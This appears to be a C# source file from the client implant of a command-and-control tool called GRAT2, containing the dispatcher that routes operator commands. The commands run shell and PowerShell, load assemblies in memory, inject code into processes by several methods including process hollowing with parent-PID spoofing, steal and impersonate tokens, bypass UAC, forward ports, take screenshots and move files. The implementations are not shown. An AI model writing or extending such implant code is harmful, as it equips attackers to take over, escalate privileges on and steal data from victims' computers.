using System;
using System.Collections.Generic;
using System.Threading;

namespace GRAT2_Client.PInvoke
{
    class Tasks
    {
        public static List<String> ValidArguments = new List<string> { "localip", "caretrun", "uac", "maketoken", "revtoself", "stealtoken", "dynamic_injectcrt", "ppid_processhollow", "processhollow", "injectppidapc", "injectcrt", "injectapc", "rportfwd", "whoami", "hostname", "domain", "screenshot", "download", "upload", "cd", "run", "sleep", "exit", "shell", "powershell", "powerscript", "executeassembly", "ps", "pwd", "ls", "pid" };
        static public string Run(string[] args)
        {
            var methodName = args[0];
            switch (methodName.ToLower())
            {

                case "sleep":
                    return Execute.sleep(args);
                case "exit":
                    System.Environment.Exit(1); break;
                case "shell":
                    return Execute.cmd(args);
                case "powershell":
                    return Execute.UnPosh(args);
                case "powerscript":
                    return Execute.UnPosh(args);
                case "executeassembly":
                    return Execute.ExeAssembly(args);
                case "ps":
                    return Execute.ListProcess();
                case "pwd":
                    return Execute.CurrentDirectory();
                case "ls":
                    return Execute.DirectoryListing(args);
                case "pid":
                    return Execute.GetCurrentProcess();
                case "run":
                    return Execute.RunCmd(args);
                case "cd":
                    return Execute.ChangeDir(args);
                case "upload":
                    return Execute.upload(args);
                case "download":
                    return Execute.download(args);
                case "screenshot":
                    return Execute.takeScreenShot();
                case "whoami":
                    return Execute.whoami();
                case "hostname":
                    return Execute.hostname();
                case "domain":
                    return Execute.domain();
                case "rportfwd":
                    new Thread(() => { Execute.rportfwd(args); }).Start();
                    return "rportfwd Started!";
                case "injectapc":
                    return Injectious.UserAPC.InjectAPC(args);
                case "injectcrt":
                    return Injectious.CreateRemThread.InjectCreateRemThread(args);
                case "injectppidapc":
                    return Injectious.UserAPCPPID.InjectAPCPPID(args);
                case "processhollow":
                    return Injectious.ProcHollowing.ProcHollowRun(args);
                case "ppid_processhollow":
                    return Injectious.ProcHollowing.PPidProcHollowRun(args);
                case "dynamic_injectcrt":
                    return Injectious.DCreateRemThread.Dynamic_InjectCreateRemThread(args);
                case "stealtoken":
                    return Tokens_UAC.ProcessImpersonation.ProcImpersonation(args);
                case "revtoself":
                    return Tokens_UAC.ProcessImpersonation.RevertToSelf();
                case "maketoken":
                    return Tokens_UAC.ProcessImpersonation.UserImpersonation(args);
                case "uac":
                    return Tokens_UAC.UAC_Bypass.Disk(args);
                case "caretrun":
                    return Execute.RunCmd(args);
                case "localip":
                    return Execute.getLocalIP();
                default:
                    break;
            }
            return "Command not found";
        }

    }
}
